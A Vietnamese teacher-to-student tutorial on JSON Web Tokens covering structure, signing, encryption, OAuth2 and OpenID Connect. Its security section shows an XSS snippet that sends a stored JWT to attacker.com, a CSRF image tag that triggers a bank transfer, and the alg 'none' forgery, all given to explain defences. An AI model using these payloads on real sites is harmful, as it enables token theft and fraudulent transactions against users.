# 📚 HỌC JWT TỪ CƠ BẢN ĐẾN NÂNG CAO

**Tài liệu học tập chi tiết - Theo phong cách Thầy - Trò**  
*Từ The JWT Handbook v0.14.1 - Dành cho người Việt*

---

## 🎯 MỤC LỤC

1. [Phần 1: Giới thiệu về JWT](#phan-1)
2. [Phần 2: Các ứng dụng thực tế](#phan-2)
3. [Phần 3: Cấu trúc chi tiết của JWT](#phan-3)
4. [Phần 4: JSON Web Signatures (JWS)](#phan-4)
5. [Phần 5: JSON Web Encryption (JWE)](#phan-5)
6. [Phần 6: JSON Web Keys (JWK)](#phan-6)
7. [Phần 7: Các thuật toán](#phan-7)
8. [Phần 8: Best Practices & Bảo mật](#phan-8)

---

## <a id="phan-1"></a>📖 PHẦN 1: GIỚI THIỆU VỀ JWT

### 1.1. JWT là gì?

Chào em! Hôm nay thầy sẽ dạy em về **JWT** - một công nghệ rất quan trọng trong lập trình web hiện đại.

**JWT** là viết tắt của **JSON Web Token** (đọc là "jot"). Nó là một tiêu chuẩn để **truyền thông tin một cách an toàn** giữa các bên trong môi trường có giới hạn không gian.

#### JWT trông như thế nào?

Một JWT trông như thế này (thầy xuống dòng cho dễ nhìn):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.
TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

Nhìn có vẻ khó hiểu nhỉ? Nhưng đừng lo, khi giải mã ra, nó chỉ là 2 JSON objects thôi:

**Header (phần đầu):**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload (phần chứa dữ liệu):**
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```

### 1.2. JWT giải quyết vấn đề gì?

Thầy sẽ cho em một ví dụ thực tế dễ hiểu:

**Trước khi có JWT:**
- User đăng nhập → Server tạo session ID → Lưu vào database
- Mỗi lần user request → Server phải query database để kiểm tra session
- Nếu có nhiều server → Phải share session (rất phức tạp!)

**Khi dùng JWT:**
- User đăng nhập → Server tạo JWT (chứa luôn thông tin user)
- User giữ JWT → Gửi kèm mỗi request
- Server chỉ cần **verify chữ ký** → Không cần query database!
- Nhiều server cũng OK → Chỉ cần cùng một secret key!

**Ưu điểm chính:**
✅ **Stateless**: Server không cần lưu trữ session  
✅ **Scalable**: Dễ mở rộng hệ thống  
✅ **Compact**: Kích thước nhỏ gọn  
✅ **Self-contained**: Chứa đủ thông tin cần thiết  

### 1.3. Lịch sử phát triển

**2011**: Nhóm JOSE (JSON Object Signing and Encryption) được thành lập

**2013**: Các bản draft đầu tiên ra đời

**2015**: Các RFC chính thức được công bố:
- RFC 7519: JWT
- RFC 7515: JWS (JSON Web Signature)
- RFC 7516: JWE (JSON Web Encryption)  
- RFC 7517: JWK (JSON Web Key)
- RFC 7518: JWA (JSON Web Algorithms)

**Tác giả chính**: Mike Jones, Nat Sakimura, John Bradley, Joe Hildebrand

---

## <a id="phan-2"></a>💼 PHẦN 2: CÁC ỨNG DỤNG THỰC TẾ

### 2.1. Client-side Sessions (Stateless Sessions)

#### Khái niệm

Thay vì lưu session trên server, ta lưu **trực tiếp trên client** dưới dạng JWT!

**Cách hoạt động:**

```
1. User đăng nhập
2. Server tạo JWT chứa thông tin user
3. Gửi JWT về client (thường lưu trong cookie hoặc localStorage)
4. Client gửi JWT kèm mỗi request
5. Server verify JWT → Lấy thông tin user
```

#### Ví dụ thực tế: Shopping Cart

Giả sử em đang làm một trang web bán hàng:

**JWT Payload:**
```json
{
  "userId": "12345",
  "cart": [
    { "productId": 1, "name": "iPhone", "quantity": 1 },
    { "productId": 2, "name": "iPad", "quantity": 2 }
  ],
  "iat": 1609459200,
  "exp": 1609545600
}
```

**Code mẫu (Node.js):**
```javascript
// Tạo JWT khi thêm sản phẩm vào giỏ
app.post('/cart/add', (req, res) => {
  const cart = req.body.cart;
  
  const token = jwt.sign(
    { userId: req.user.id, cart: cart },
    process.env.SECRET_KEY,
    { expiresIn: '24h' }
  );
  
  res.cookie('cart', token, {
    httpOnly: true, // Bảo vệ khỏi XSS
    maxAge: 24 * 60 * 60 * 1000
  });
  
  res.json({ success: true });
});

// Đọc giỏ hàng từ JWT
app.get('/cart', (req, res) => {
  const token = req.cookies.cart;
  
  try {
    const decoded = jwt.verify(token, process.env.SECRET_KEY);
    res.json({ cart: decoded.cart });
  } catch(err) {
    res.json({ cart: [] });
  }
});
```

#### Vấn đề bảo mật cần lưu ý

**1. Signature Stripping (Tấn công gỡ chữ ký)**

Kẻ tấn công có thể:
- Xóa phần signature
- Đổi header thành `{"alg": "none"}`
- Server nếu không kiểm tra kỹ → Chấp nhận token giả!

**Cách phòng chống:**
```javascript
// ❌ SAI: Không chỉ định algorithm
jwt.verify(token, secret);

// ✅ ĐÚNG: Luôn chỉ định algorithm rõ ràng
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

**2. Cross-Site Request Forgery (CSRF)**

**Tình huống:**
```html
<!-- Trang web độc hại -->
<img src="http://banksite.com/transfer?to=attacker&amount=1000000">
```

Nếu user đã đăng nhập banksite.com và JWT lưu trong cookie → Request tự động gửi kèm JWT!

**Cách phòng chống:**
- Dùng CSRF token
- Không lưu JWT trong cookie (dùng localStorage + gửi qua header)
- Set SameSite cookie attribute

**3. Cross-Site Scripting (XSS)**

Nếu JWT lưu trong localStorage → JavaScript có thể đọc được!

```javascript
// Kẻ tấn công inject script
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('jwt')
  });
</script>
```

**Cách phòng chống:**
- Sanitize mọi input từ user
- Dùng Content Security Policy (CSP)
- Lưu JWT trong httpOnly cookie (JS không đọc được)

### 2.2. Federated Identity (Đăng nhập tập trung)

#### Khái niệm

**Federated Identity** cho phép user dùng **một tài khoản** để đăng nhập vào **nhiều dịch vụ khác nhau**.

**Ví dụ thực tế em hay gặp:**
- Đăng nhập vào trang web bằng tài khoản Google
- Đăng nhập vào game bằng tài khoản Facebook
- Đăng nhập vào Spotify bằng tài khoản Apple

#### Luồng hoạt động cơ bản

```
┌─────────┐          ┌──────────────┐          ┌─────────────┐
│  User   │          │ Your Website │          │   Google    │
│         │          │  (Resource)  │          │ (Identity)  │
└────┬────┘          └──────┬───────┘          └──────┬──────┘
     │                      │                         │
     │ 1. Click "Login"     │                         │
     ├─────────────────────>│                         │
     │                      │                         │
     │ 2. Redirect to Google                          │
     │                      ├────────────────────────>│
     │                      │                         │
     │ 3. Login with Google │                         │
     ├──────────────────────┼────────────────────────>│
     │                      │                         │
     │ 4. Return JWT token  │                         │
     │<─────────────────────┼─────────────────────────┤
     │                      │                         │
     │ 5. Send JWT to website                         │
     ├─────────────────────>│                         │
     │                      │                         │
     │ 6. Verify JWT & Login                          │
     │<─────────────────────┤                         │
     │                      │                         │
```

#### Access Token vs Refresh Token

Đây là 2 khái niệm rất quan trọng em cần nắm rõ:

**Access Token:**
- Dùng để **truy cập tài nguyên** (gọi API)
- **Thời gian sống ngắn** (thường 15-60 phút)
- Chứa thông tin user và quyền hạn
- Khi hết hạn → Phải dùng Refresh Token để lấy token mới

**Refresh Token:**
- Dùng để **lấy Access Token mới**
- **Thời gian sống dài** (vài ngày, vài tuần, thậm chí vài tháng)
- Chỉ gửi đến Authorization Server
- Bị đánh cắp → Có thể blacklist

**Tại sao cần 2 loại token?**

Thầy giải thích bằng ví dụ:

**Access Token** giống như **thẻ ra vào công ty**:
- Dùng nhiều lần trong ngày
- Hết hạn cuối ngày
- Nếu mất → Kẻ xấu chỉ dùng được 1 ngày

**Refresh Token** giống như **CMND/CCCD**:
- Chỉ dùng khi cần gia hạn thẻ
- Thời hạn dài
- Bảo quản cẩn thận
- Mất → Phải đi làm lại (blacklist)

**Code mẫu:**

```javascript
// Tạo cả 2 tokens khi đăng nhập
app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  
  const accessToken = jwt.sign(
    { userId: user.id, role: user.role },
    process.env.ACCESS_SECRET,
    { expiresIn: '15m' }  // 15 phút
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }  // 7 ngày
  );
  
  // Lưu refresh token vào DB
  saveRefreshToken(user.id, refreshToken);
  
  res.json({ accessToken, refreshToken });
});

// Dùng refresh token để lấy access token mới
app.post('/refresh', (req, res) => {
  const { refreshToken } = req.body;
  
  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
    
    // Kiểm tra refresh token còn trong DB không
    if (!isRefreshTokenValid(decoded.userId, refreshToken)) {
      throw new Error('Invalid refresh token');
    }
    
    // Tạo access token mới
    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ accessToken: newAccessToken });
  } catch(err) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

#### JWT và OAuth2

**OAuth2** là một **authorization framework** (framework ủy quyền).

**Mối quan hệ với JWT:**
- OAuth2 **không quy định** format của token
- Nhưng JWT là **lựa chọn phổ biến nhất** cho Access Token
- Vì JWT **self-contained** (chứa đủ thông tin) → Không cần query DB

**Luồng OAuth2 điển hình:**

```
1. User nhấn "Login with Google"
2. Redirect đến Google (Authorization Server)
3. User đăng nhập Google
4. Google trả về Authorization Code
5. App dùng Code đổi lấy Access Token (JWT!)
6. App dùng JWT để gọi Google APIs
```

#### JWT và OpenID Connect

**OpenID Connect** là một **authentication layer** (lớp xác thực) xây dựng trên OAuth2.

**Điểm khác với OAuth2:**
- OAuth2: Chỉ ủy quyền (authorization) - "App X được phép làm Y"
- OpenID Connect: Cả authentication + authorization - "Đây là user Z, app X được phép làm Y"

**ID Token:**
OpenID Connect định nghĩa một loại token đặc biệt gọi là **ID Token** (luôn là JWT):

```json
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",
  "aud": "your-app-id",
  "exp": 1609545600,
  "iat": 1609459200,
  "name": "Nguyễn Văn A",
  "email": "nguyenvana@gmail.com",
  "picture": "https://...jpg"
}
```

**Các claims quan trọng:**
- `iss` (issuer): Ai cấp token này (Google, Facebook...)
- `sub` (subject): ID của user
- `aud` (audience): Token này cho app nào
- `exp` (expiration): Hết hạn khi nào
- `iat` (issued at): Cấp lúc nào

---

## <a id="phan-3"></a>🔍 PHẦN 3: CẤU TRÚC CHI TIẾT CỦA JWT

### 3.1. Cấu trúc tổng quan

Một JWT gồm **3 phần** cách nhau bởi dấu chấm `.`:

```
[HEADER].[PAYLOAD].[SIGNATURE]
```

Ví dụ thực tế:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9
.
TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

### 3.2. Header (Phần đầu)

Header chứa **metadata** về JWT, thường có 2 claims:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Các claims trong Header:**

**1. `alg` (Algorithm) - BẮT BUỘC**
- Thuật toán dùng để ký/mã hóa
- Các giá trị phổ biến:
  - `HS256`: HMAC với SHA-256 (shared secret)
  - `RS256`: RSA với SHA-256 (public/private key)
  - `ES256`: ECDSA với curve P-256 (elliptic curve)
  - `none`: Không ký (⚠️ cẩn thận!)

**2. `typ` (Type) - TÙY CHỌN**
- Loại token (thường là `JWT`)
- Chỉ cần khi trộn JWT với các object khác

**3. `cty` (Content Type) - TÙY CHỌN**
- Loại nội dung trong payload
- Chỉ dùng khi JWT lồng nhau (nested JWT)

### 3.3. Payload (Phần chứa dữ liệu)

Payload chứa **claims** - các thông tin về user/token.

#### Registered Claims (Claims chuẩn)

Đây là các claims được định nghĩa sẵn trong spec:

**1. `iss` (Issuer) - Người phát hành**
```json
{
  "iss": "https://auth.myapp.com"
}
```
- Ai tạo ra token này?
- Thường là domain của Authorization Server

**2. `sub` (Subject) - Chủ thể**
```json
{
  "sub": "user_12345"
}
```
- Token này nói về ai?
- Thường là user ID

**3. `aud` (Audience) - Đối tượng nhận**
```json
{
  "aud": "https://api.myapp.com"
}
```
hoặc
```json
{
  "aud": ["https://api.myapp.com", "https://admin.myapp.com"]
}
```
- Token này dùng cho dịch vụ nào?
- Có thể là string hoặc array

**4. `exp` (Expiration Time) - Thời gian hết hạn**
```json
{
  "exp": 1609545600
}
```
- Token hết hạn khi nào? (Unix timestamp)
- **Rất quan trọng** để bảo mật!

**5. `nbf` (Not Before) - Không dùng trước**
```json
{
  "nbf": 1609459200
}
```
- Token chỉ hợp lệ sau thời điểm này

**6. `iat` (Issued At) - Thời gian phát hành**
```json
{
  "iat": 1609459200
}
```
- Token được tạo lúc nào?

**7. `jti` (JWT ID) - ID duy nhất**
```json
{
  "jti": "abc123xyz"
}
```
- ID duy nhất của token
- Dùng để prevent replay attacks

#### Public Claims vs Private Claims

**Private Claims (Claims riêng):**
- Do người dùng tự định nghĩa
- Chỉ dùng trong hệ thống của mình
- Cẩn thận collision (trùng tên)

```json
{
  "userId": "12345",
  "role": "admin",
  "permissions": ["read", "write", "delete"]
}
```

**Public Claims (Claims công khai):**
- Đăng ký với IANA JWT Claims Registry
- Hoặc dùng prefix để tránh trùng

```json
{
  "https://myapp.com/claims/role": "admin"
}
```

**Ví dụ JWT đầy đủ:**

```json
{
  "iss": "https://auth.myapp.com",
  "sub": "user_12345",
  "aud": "https://api.myapp.com",
  "exp": 1609545600,
  "iat": 1609459200,
  "name": "Nguyễn Văn A",
  "email": "nguyenvana@example.com",
  "role": "admin",
  "permissions": ["read", "write"]
}
```

### 3.4. Unsecured JWT (JWT không ký)

**Khi nào dùng?**
- Chỉ khi data **không cần bảo mật**
- Ví dụ: Lưu UI state ở client
- **⚠️ CẨN THẬN**: Dễ bị giả mạo!

**Cấu trúc:**

Header:
```json
{
  "alg": "none"
}
```

Encoded:
```
eyJhbGciOiJub25lIn0
.
eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkpvaG4gRG9lIn0
.
```

**Lưu ý:** Vẫn có dấu `.` cuối cùng nhưng không có signature!

### 3.5. Cách encode/decode JWT

#### Base64-URL Encoding

JWT dùng **Base64-URL encoding** (khác với Base64 thông thường):

**Khác biệt:**
- `+` → `-`
- `/` → `_`
- Bỏ padding `=`

**Tại sao?** Để JWT **URL-safe** (có thể dùng trong URL)

#### Tạo JWT (Encoding)

**Bước 1:** Tạo Header JSON → Encode Base64-URL
```javascript
const header = { alg: "HS256", typ: "JWT" };
const encodedHeader = base64url(JSON.stringify(header));
// Kết quả: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
```

**Bước 2:** Tạo Payload JSON → Encode Base64-URL
```javascript
const payload = { sub: "1234567890", name: "John Doe" };
const encodedPayload = base64url(JSON.stringify(payload));
// Kết quả: "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0"
```

**Bước 3:** Tạo Signature
```javascript
const signature = HMACSHA256(
  encodedHeader + "." + encodedPayload,
  secret
);
const encodedSignature = base64url(signature);
```

**Bước 4:** Ghép lại
```javascript
const jwt = encodedHeader + "." + encodedPayload + "." + encodedSignature;
```

#### Đọc JWT (Decoding)

**Code mẫu:**

```javascript
function decodeJWT(jwt) {
  const parts = jwt.split('.');
  
  if (parts.length !== 3) {
    throw new Error('Invalid JWT format');
  }
  
  const header = JSON.parse(base64UrlDecode(parts[0]));
  const payload = JSON.parse(base64UrlDecode(parts[1]));
  const signature = parts[2];
  
  return { header, payload, signature };
}

function base64UrlDecode(str) {
  // Thêm padding
  str += '='.repeat((4 - str.length % 4) % 4);
  // Chuyển về Base64 thường
  str = str.replace(/-/g, '+').replace(/_/g, '/');
  // Decode
  return Buffer.from(str, 'base64').toString('utf8');
}
```

**⚠️ Lưu ý quan trọng:**
- Decode ≠ Verify!
- Decode chỉ đọc được nội dung
- **Phải verify signature** trước khi tin tưởng!

---

## <a id="phan-4"></a>🔐 PHẦN 4: JSON WEB SIGNATURES (JWS)

### 4.1. JWS là gì?

**JWS** = JSON Web Signature = **Chữ ký số cho JWT**

**Mục đích:**
- Đảm bảo **tính toàn vẹn** (integrity) - data không bị sửa
- Đảm bảo **tính xác thực** (authenticity) - biết ai tạo ra
- **KHÔNG** đảm bảo bí mật (data vẫn đọc được)

**⚠️ Sai lầm thường gặp:**
Nhiều người nghĩ JWT có chữ ký = Data được mã hóa → **SAI!**

Chữ ký chỉ ngăn **sửa đổi**, không ngăn **đọc**!

### 4.2. Các thuật toán ký

JWT hỗ trợ nhiều thuật toán, chia làm 2 nhóm chính:

#### Nhóm 1: Symmetric (Shared Secret) - Dùng chung secret

**HS256, HS384, HS512** (HMAC + SHA)

**Đặc điểm:**
- Cùng một secret để **ký VÀ verify**
- Nhanh, đơn giản
- Phù hợp: Single server hoặc trusted parties

**Ví dụ:**

```javascript
const jwt = require('jsonwebtoken');

const secret = 'my-super-secret-key-at-least-32-characters-long';

// Ký
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  secret,
  { algorithm: 'HS256' }
);

// Verify
try {
  const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256']  // Luôn chỉ định!
  });
  console.log(decoded);
} catch(err) {
  console.log('Invalid token!');
}
```

**⚠️ Lưu ý:**
- Secret phải **đủ dài** (tối thiểu 32 ký tự cho HS256)
- Secret phải **random** (không dùng password)
- **Không** để lộ secret!

#### Nhóm 2: Asymmetric (Public/Private Key)

**RS256, RS384, RS512** (RSA + SHA)  
**ES256, ES384, ES512** (ECDSA)  
**PS256, PS384, PS512** (RSA-PSS)

**Đặc điểm:**
- **Private key** để ký
- **Public key** để verify
- Phù hợp: Federated identity, microservices

**Ví dụ RS256:**

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

// Đọc keys từ file
const privateKey = fs.readFileSync('private.pem');
const publicKey = fs.readFileSync('public.pem');

// Ký bằng private key
const token = jwt.sign(
  { userId: 123, role: 'admin' },
  privateKey,
  { algorithm: 'RS256' }
);

// Verify bằng public key
try {
  const decoded = jwt.verify(token, publicKey, {
    algorithms: ['RS256']
  });
  console.log(decoded);
} catch(err) {
  console.log('Invalid token!');
}
```

**Tạo RSA keys bằng OpenSSL:**

```bash
# Tạo private key
openssl genrsa -out private.pem 2048

# Tạo public key từ private key
openssl rsa -in private.pem -pubout -out public.pem
```

### 4.3. So sánh HS256 vs RS256

Thầy làm bảng so sánh cho em dễ nhớ:

| Tiêu chí | HS256 | RS256 |
|----------|-------|-------|
| **Loại key** | Shared secret | Public/Private key |
| **Ai có thể ký?** | Tất cả có secret | Chỉ có private key |
| **Ai có thể verify?** | Tất cả có secret | Tất cả có public key |
| **Tốc độ** | Nhanh hơn | Chậm hơn |
| **Độ phức tạp** | Đơn giản | Phức tạp hơn |
| **Khi nào dùng?** | Single server, trusted parties | Microservices, federated identity |
| **Ví dụ** | Web app nhỏ | Auth0, Google login |

**Khi nào dùng cái nào?**

**Dùng HS256 khi:**
- Hệ thống nhỏ, một server
- Tất cả services đều tin cậy
- Cần performance cao

**Dùng RS256 khi:**
- Nhiều services/servers khác nhau
- Có bên thứ 3 cần verify token
- Federated identity (Google, Facebook login...)

### 4.4. Cách hoạt động của HS256 (HMAC)

**HMAC** = Hash-based Message Authentication Code

**Công thức:**
```
HMAC(message, secret) = Hash(
  (secret XOR opad) + Hash((secret XOR ipad) + message)
)
```

Nghe phức tạp nhỉ? Thầy giải thích đơn giản:

**Bước 1:** Chuẩn bị secret
```javascript
// Nếu secret ngắn hơn block size → pad với 0
// Nếu secret dài hơn block size → hash nó
const paddedSecret = prepareSecret(secret, blockSize);
```

**Bước 2:** Tính inner hash
```javascript
const innerPad = paddedSecret XOR 0x36 (lặp lại)
const innerHash = SHA256(innerPad + message);
```

**Bước 3:** Tính outer hash
```javascript
const outerPad = paddedSecret XOR 0x5C (lặp lại)
const signature = SHA256(outerPad + innerHash);
```

**Code đơn giản hóa:**

```javascript
const crypto = require('crypto');

function signHS256(message, secret) {
  return crypto
    .createHmac('sha256', secret)
    .update(message)
    .digest('base64url');
}

function verifyHS256(message, secret, signature) {
  const expectedSignature = signHS256(message, secret);
  return signature === expectedSignature;
}
```

### 4.5. Cách hoạt động của RS256 (RSA)

**RSA** dựa trên **bài toán phân tích thừa số nguyên tố** - rất khó với số lớn!

**Nguyên lý:**

1. **Chọn 2 số nguyên tố lớn** p và q
2. **Tính n = p × q** (modulus)
3. **Chọn e** (public exponent, thường là 65537)
4. **Tính d** (private exponent) sao cho: `d × e ≡ 1 (mod φ(n))`

**Public key:** (n, e)  
**Private key:** (n, d)

**Ký:**
```
signature = (hash(message))^d mod n
```

**Verify:**
```
hash_from_signature = signature^e mod n
hash_from_message = hash(message)

if hash_from_signature == hash_from_message:
    valid!
```

**Tại sao RSA an toàn?**

Vì **rất khó** tìm d khi chỉ biết e và n (phải phân tích n thành p × q)

**Code ví dụ:**

```javascript
const crypto = require('crypto');

function signRS256(message, privateKey) {
  const sign = crypto.createSign('RSA-SHA256');
  sign.update(message);
  return sign.sign(privateKey, 'base64url');
}

function verifyRS256(message, publicKey, signature) {
  const verify = crypto.createVerify('RSA-SHA256');
  verify.update(message);
  return verify.verify(publicKey, signature, 'base64url');
}
```

### 4.6. Cách hoạt động của ES256 (ECDSA)

**ECDSA** = Elliptic Curve Digital Signature Algorithm

**Ưu điểm so với RSA:**
- **Key nhỏ hơn** nhưng **cùng độ an toàn**
- ES256 (256-bit) ≈ RS256 (3072-bit)
- Nhanh hơn, ít tốn bộ nhớ hơn

**Đường cong P-256:**

Được định nghĩa bởi phương trình:
```
y² = x³ + ax + b (mod p)
```

Với các tham số chuẩn đã định sẵn.

**Code ví dụ:**

```bash
# Tạo ECDSA keys
openssl ecparam -name prime256v1 -genkey -noout -out ec-private.pem
openssl ec -in ec-private.pem -pubout -out ec-public.pem
```

```javascript
const jwt = require('jsonwebtoken');
const fs = require('fs');

const privateKey = fs.readFileSync('ec-private.pem');
const publicKey = fs.readFileSync('ec-public.pem');

// Ký
const token = jwt.sign(
  { userId: 123 },
  privateKey,
  { algorithm: 'ES256' }
);

// Verify
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['ES256']
});
```

### 4.7. JWS Compact vs JSON Serialization

#### Compact Serialization (Thông dụng)

**Format:**
```
BASE64URL(header).BASE64URL(payload).BASE64URL(signature)
```

**Đặc điểm:**
- Chỉ **1 chữ ký**
- Gọn nhẹ
- Phổ biến nhất

#### JSON Serialization (Đầy đủ)

**Format:**
```json
{
  "payload": "BASE64URL(payload)",
  "signatures": [
    {
      "protected": "BASE64URL(header1)",
      "signature": "BASE64URL(signature1)"
    },
    {
      "protected": "BASE64URL(header2)",
      "signature": "BASE64URL(signature2)"
    }
  ]
}
```

**Đặc điểm:**
- Hỗ trợ **nhiều chữ ký**
- Dùng khi cần ký bởi nhiều bên
- Ít phổ biến

**Khi nào dùng JSON Serialization?**

Ví dụ: Document cần ký bởi cả manager VÀ director:

```json
{
  "payload": "eyJkb2N1bWVudCI6Ii4uLiJ9",
  "signatures": [
    {
      "protected": "eyJhbGciOiJSUzI1NiIsImtpZCI6Im1hbmFnZXIifQ",
      "signature": "..."
    },
    {
      "protected": "eyJhbGciOiJFUzI1NiIsImtpZCI6ImRpcmVjdG9yIn0",
      "signature": "..."
    }
  ]
}
```

---

## <a id="phan-5"></a>🔒 PHẦN 5: JSON WEB ENCRYPTION (JWE)

### 5.1. JWE là gì?

**JWE** = JSON Web Encryption = **Mã hóa JWT**

**So sánh JWS vs JWE:**

| | JWS | JWE |
|---|---|---|
| **Mục đích** | Đảm bảo toàn vẹn | Đảm bảo bí mật |
| **Data** | Đọc được | Không đọc được |
| **Chống** | Sửa đổi | Đọc trộm |
| **Khi nào dùng** | Hầu hết trường hợp | Data nhạy cảm |

**⚠️ Quan trọng:**

JWE **KHÔNG thay thế** JWS!

Vì JWE (public key) cho phép **bất kỳ ai có public key** đều **tạo được** token mới!

→ Cần **nested JWT**: JWS bên trong JWE

### 5.2. Cấu trúc JWE

JWE có **5 phần** (thay vì 3 như JWS):

```
BASE64URL(header)
.
BASE64URL(encrypted_key)
.
BASE64URL(initialization_vector)
.
BASE64URL(ciphertext)
.
BASE64URL(authentication_tag)
```

**Giải thích từng phần:**

**1. Header:** Giống JWS
```json
{
  "alg": "RSA-OAEP",      // Thuật toán mã hóa key
  "enc": "A128GCM"        // Thuật toán mã hóa content
}
```

**2. Encrypted Key:** Key đã được mã hóa
- CEK (Content Encryption Key) được mã hóa bằng public key
- Hoặc empty nếu dùng direct encryption

**3. Initialization Vector (IV):**
- Dữ liệu ngẫu nhiên cho thuật toán mã hóa
- Đảm bảo cùng plaintext → khác ciphertext

**4. Ciphertext:**
- Payload đã được mã hóa

**5. Authentication Tag:**
- Đảm bảo ciphertext không bị sửa
- Giống signature nhưng cho encrypted data

### 5.3. Key Encryption Algorithms (Mã hóa Key)

**Thuật toán `alg` header:**

**1. RSA Family:**
- `RSA1_5`: RSA PKCS#1 v1.5 (deprecated)
- `RSA-OAEP`: RSA OAEP (recommended)
- `RSA-OAEP-256`: RSA OAEP + SHA-256

**2. AES Key Wrap:**
- `A128KW`: AES-128 Key Wrap
- `A192KW`: AES-192 Key Wrap
- `A256KW`: AES-256 Key Wrap

**3. Elliptic Curve:**
- `ECDH-ES`: ECDH Ephemeral Static
- `ECDH-ES+A128KW`: ECDH-ES + AES-128 KW
- `ECDH-ES+A192KW`: ECDH-ES + AES-192 KW
- `ECDH-ES+A256KW`: ECDH-ES + AES-256 KW

**4. Password-based:**
- `PBES2-HS256+A128KW`: Password + HMAC-SHA256 + AES-128
- `PBES2-HS384+A192KW`: Password + HMAC-SHA384 + AES-192
- `PBES2-HS512+A256KW`: Password + HMAC-SHA512 + AES-256

**5. Direct:**
- `dir`: Dùng trực tiếp shared secret (không wrap)

### 5.4. Content Encryption Algorithms (Mã hóa Content)

**Thuật toán `enc` header:**

**1. AES GCM (Recommended):**
- `A128GCM`: AES-128 GCM
- `A192GCM`: AES-192 GCM  
- `A256GCM`: AES-256 GCM

**2. AES CBC + HMAC:**
- `A128CBC-HS256`: AES-128 CBC + HMAC-SHA256
- `A192CBC-HS384`: AES-192 CBC + HMAC-SHA384
- `A256CBC-HS512`: AES-256 CBC + HMAC-SHA512

**Nên dùng cái nào?**

✅ **AES GCM**: Nhanh hơn, hiện đại hơn  
⚠️ **AES CBC**: Tương thích tốt hơn với hệ thống cũ

### 5.5. Code Example - Mã hóa/Giải mã

**Ví dụ với node-jose library:**

```javascript
const jose = require('node-jose');

// Tạo keystore
const keystore = jose.JWK.createKeyStore();

// Generate RSA key
await keystore.generate('RSA', 2048, { alg: 'RSA-OAEP', use: 'enc' });

const key = keystore.get({ use: 'enc' });

// Payload
const payload = JSON.stringify({
  userId: 123,
  ssn: '123-45-6789',  // Dữ liệu nhạy cảm!
  creditCard: '4111-1111-1111-1111'
});

// Mã hóa
const encrypted = await jose.JWE.createEncrypt(
  { format: 'compact' },
  key
)
  .update(payload)
  .final();

console.log('Encrypted JWT:', encrypted);

// Giải mã
const decrypted = await jose.JWE.createDecrypt(keystore)
  .decrypt(encrypted);

console.log('Decrypted:', decrypted.payload.toString());
```

### 5.6. Key Management Modes

JWE định nghĩa 5 modes quản lý key:

**1. Key Wrapping**
- CEK được **mã hóa** bằng symmetric algorithm
- Ví dụ: A256KW

```
Random CEK → Encrypt với AES → Encrypted CEK
```

**2. Key Encryption**
- CEK được **mã hóa** bằng asymmetric algorithm
- Ví dụ: RSA-OAEP

```
Random CEK → Encrypt với RSA Public Key → Encrypted CEK
```

**3. Direct Key Agreement**
- CEK được **tính toán** từ key agreement
- Ví dụ: ECDH-ES

```
Private Key + Public Key → Derive CEK
```

**4. Key Agreement with Key Wrapping**
- Kết hợp 2 cách trên
- Ví dụ: ECDH-ES+A256KW

```
Key Agreement → KEK → Wrap CEK → Encrypted CEK
```

**5. Direct Encryption**
- Dùng **trực tiếp** shared secret làm CEK
- Ví dụ: dir

```
Shared Secret = CEK (no wrapping)
```

### 5.7. Nested JWT (JWS + JWE)

**Khi nào cần?**

Khi cần **cả bảo mật lẫn toàn vẹn**:
- Encrypt để không ai đọc được
- Sign để đảm bảo ai tạo ra

**Thứ tự: Sign trước, Encrypt sau**

```
Payload → JWS (Sign) → JWE (Encrypt) → Final Token
```

**Tại sao?**

Nếu encrypt trước:
- Attacker có thể thay đổi ciphertext
- Dù không biết plaintext
- → Padding oracle attacks, etc.

**Code mẫu:**

```javascript
// Bước 1: Sign
const signed = await jose.JWS.createSign(
  { format: 'compact' },
  signingKey
)
  .update(JSON.stringify(payload))
  .final();

// Bước 2: Encrypt (signed JWT)
const encrypted = await jose.JWE.createEncrypt(
  { format: 'compact' },
  encryptionKey
)
  .update(signed)  // Encrypt cái JWT đã sign!
  .final();

// Giải mã:
// Bước 1: Decrypt
const decryptResult = await jose.JWE.createDecrypt(keystore)
  .decrypt(encrypted);

const signedJWT = decryptResult.payload.toString();

// Bước 2: Verify
const verifyResult = await jose.JWS.createVerify(keystore)
  .verify(signedJWT);

const payload = JSON.parse(verifyResult.payload.toString());
```

**⚠️ Lưu ý quan trọng:**

Phải **verify cả 2 layers**:
1. Decrypt outer JWE ✅
2. Verify inner JWS ✅

Thiếu bước 2 = **lỗ hổng bảo mật**!

---

*[Tài liệu còn tiếp tục với các phần 6, 7, 8... do độ dài quá lớn, thầy sẽ tạo thành nhiều file riêng biệt]*

---

## 📌 TÓM TẮT NHỮNG ĐIỀU QUAN TRỌNG NHẤT

### Checklist kiến thức cơ bản

